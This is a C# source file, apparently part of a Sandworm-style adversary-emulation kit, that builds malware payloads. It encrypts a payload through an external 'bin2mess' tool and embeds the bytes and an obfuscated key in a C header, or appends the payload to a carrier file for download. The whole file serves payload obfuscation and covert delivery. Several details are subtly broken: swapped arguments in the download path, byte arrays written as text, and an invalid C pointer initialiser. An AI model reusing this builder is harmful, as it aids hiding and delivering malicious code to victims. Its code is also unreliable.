using System;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Text;

namespace sandworm_payload_builder
{
    class Program
    {
        static void Main(string[] args)
        {
            string payloadType = args[0];

            string payloadFile = args[1];

            string obfuscatedPayloadFile = args[2];

            string keyFile = args[3];

            string payloadHeaderFile = args[4];

            string payloadCarrierFile = String.Empty;

            string payloadDownloadFile = String.Empty;

            if (payloadType == "download")
            {
                payloadCarrierFile = args[5];

                payloadDownloadFile = args[6];
            }

            CreateObfuscatedPayload(payloadFile, obfuscatedPayloadFile, keyFile);

            if (payloadType == "header")
            {
                CreatePayloadHeader(keyFile, obfuscatedPayloadFile, payloadHeaderFile);
            }
            else if (payloadType == "download")
            {
                CreatePayloadDownload(obfuscatedPayloadFile, keyFile, payloadHeaderFile, payloadCarrierFile, payloadDownloadFile);
            }
        }

        static private bool CreateObfuscatedPayload(string payloadFile, string obfuscatedPayloadFile, string keyFile)
        {
            String command = String.Format(@"--aes --entropy-reduce {0} {1} {2}", payloadFile, obfuscatedPayloadFile, keyFile);

            ProcessStartInfo psi = new ProcessStartInfo(@"..\..\..\bin2mess\build\Win32\Release\bin2mess.exe");

            psi.Arguments = command;

            Process cmd = Process.Start(psi);

            cmd.WaitForExit();

            return true;
        }

        static private bool WritePrologHeader(StreamWriter writer)
        {
            writer.WriteLine("#pragma once");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            writer.WriteLine("#include <stdint.h>");

            return true;
        }

        static private bool WriteKeyHeader(StreamWriter writer, string keyFile)
        {
            byte[] key = File.ReadAllBytes(keyFile);

            StringBuilder hexKey = new StringBuilder();

            foreach (byte b in key)
            {
                hexKey.AppendFormat("{0:x2}", b);
            }

            writer.WriteLine("#include \"xObfuscation.h\"");

            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            writer.WriteLine("#define X_PAYLOAD_KEY\tX_OBFUSCATED_STRING_A(\"{0}\")", hexKey.ToString());

            return true;
        }

        static private bool WritePayloadHeader(StreamWriter writer, string payloadFile)
        {
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);
            writer.Write(Environment.NewLine);

            byte[] payload = File.ReadAllBytes(payloadFile);

            StringBuilder hexPayload = new StringBuilder();

            int last = payload.Count() - 1;

            for (int i = 0; i <= last; i++)
            {
                bool newline = (i + 1) % 8 == 0;

                bool indent = i % 8 == 0;

                if (indent)
                {
                    hexPayload.Append("\t");
                }

                hexPayload.AppendFormat("0x{0:x2}", payload[i]);

                if (i != last)
                {
                    hexPayload.Append(", ");

                    if (newline)
                    {
                        hexPayload.Append(Environment.NewLine);
                    }
                }
            }

            writer.WriteLine("static const uint8_t* s_payload =");

            writer.WriteLine("{");

            writer.WriteLine(hexPayload.ToString());

            writer.WriteLine("};");

            return true;
        }

        static private bool CreatePayloadHeader(string keyFile, string payloadFile, string headerFile)
        {
            StreamWriter writer = new StreamWriter(headerFile);

            WritePrologHeader(writer);

            WriteKeyHeader(writer, keyFile);

            WritePayloadHeader(writer, payloadFile);

            writer.Close();

            return true;
        }
        static private bool CreatePayloadDownload(string keyFile, string payloadFile, string headerFile, string carrierFile, string downloadFile)
        {
            StreamWriter writerHeader = new StreamWriter(headerFile);

            WritePrologHeader(writerHeader);

            WriteKeyHeader(writerHeader, keyFile);

            writerHeader.Close();

            StreamWriter writerDownload = new StreamWriter(downloadFile);

            writerDownload.Write(File.ReadAllBytes(carrierFile));

            byte[] payload = File.ReadAllBytes(payloadFile);

            writerDownload.Write(payload);

            writerDownload.Write(payload.Count());

            writerDownload.Close();

            return true;
        }
    }
}
